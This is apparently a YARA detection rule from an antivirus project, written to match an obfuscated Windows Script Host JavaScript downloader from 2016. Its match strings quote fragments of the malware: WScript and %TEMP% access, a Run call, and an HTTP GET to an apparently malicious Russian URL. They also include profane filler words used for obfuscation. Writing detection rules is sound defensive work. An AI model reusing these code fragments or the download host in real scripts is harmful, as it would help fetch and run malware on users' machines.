rule sig_20160428_51f1ac3b8e4c0b74c29fda78b62c9dbb {
  meta:
    description = "datamaliciousorder - file 20160428_51f1ac3b8e4c0b74c29fda78b62c9dbb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a552932b7c10adadd801414c57b926e99093d934a35225f9b0da9e90776f3d4e"

  strings:
    $s1  = "function DdwNjgXgbScuSxzDeiMvv(VzeBqrAzuTwxFacNpeTxk){AroLkkVbqJhpKkbVzoCbn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function TlkUieMaeLhaGnkNomMkh() {return AroLkkVbqJhpKkbVzoCbn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function DdwNjgXgbScuSxzDeiMvv(VzeBqrAzuTwxFacNpeTxk){AroLkkVbqJhpKkbVzoCbn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return SglVorAtxIvfBbuOxhXaz - MkpPyjZbeUchDqhUvoPfy;};" fullword ascii
    $s5  = "var AroLkkVbqJhpKkbVzoCbn = function RmqPqyJioZcpLieQwkOsk() {return FutAutQllVbbCcfHmyCrb[JpcBfvUsmXwcNqtRmfVyl](\"WScript\"+\"" ascii
    $s6  = "function OxiWhmPaxTaxXjbYtmCvb(SglVorAtxIvfBbuOxhXaz, MkpPyjZbeUchDqhUvoPfy){TteJxyAcgYupDtlNoyAlj = TteJxyAcgYupDtlNoyAlj * 1; " ascii
    $s7  = "EvcXblAujTjzJeaCxxWon[NqyUdkUycLbyYrkWicZvw](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var AroLkkVbqJhpKkbVzoCbn = function RmqPqyJioZcpLieQwkOsk() {return FutAutQllVbbCcfHmyCrb[JpcBfvUsmXwcNqtRmfVyl](\"WScript\"+\"" ascii
    $s9  = "var FutAutQllVbbCcfHmyCrb = this[\"WScript\"];" fullword ascii
    $s10 = "function TlkUieMaeLhaGnkNomMkh() {return AroLkkVbqJhpKkbVzoCbn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (EvcXblAujTjzJeaCxxWon[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function HxgValTozLocTbsCotHce(){return PoiScyRenWteRhrGuzAal + \"\";};" fullword ascii
    $s13 = "function OxiWhmPaxTaxXjbYtmCvb(SglVorAtxIvfBbuOxhXaz, MkpPyjZbeUchDqhUvoPfy){TteJxyAcgYupDtlNoyAlj = TteJxyAcgYupDtlNoyAlj * 1; " ascii
    $s14 = "function AyeZplHyuUzmVdwJkwYyf() {return ((XfkTaoLeePxjAiyFvbUkm == true) && (XfkTaoLeePxjAiyFvbUkm == WdaWbaDdeHbpEcdEffUsg)) ?" ascii
    $s15 = "function AyeZplHyuUzmVdwJkwYyf() {return ((XfkTaoLeePxjAiyFvbUkm == true) && (XfkTaoLeePxjAiyFvbUkm == WdaWbaDdeHbpEcdEffUsg)) ?" ascii
    $s16 = "XfkTaoLeePxjAiyFvbUkm = true; " fullword ascii
    $s17 = "}while (AggOxoOckAzcGlzSqzOde);" fullword ascii
    $s18 = "var XfkTaoLeePxjAiyFvbUkm = false;" fullword ascii
    $s19 = "var JemMusVmxDafSqjEitTeo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "GexTprSivBacVfjNneZat = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}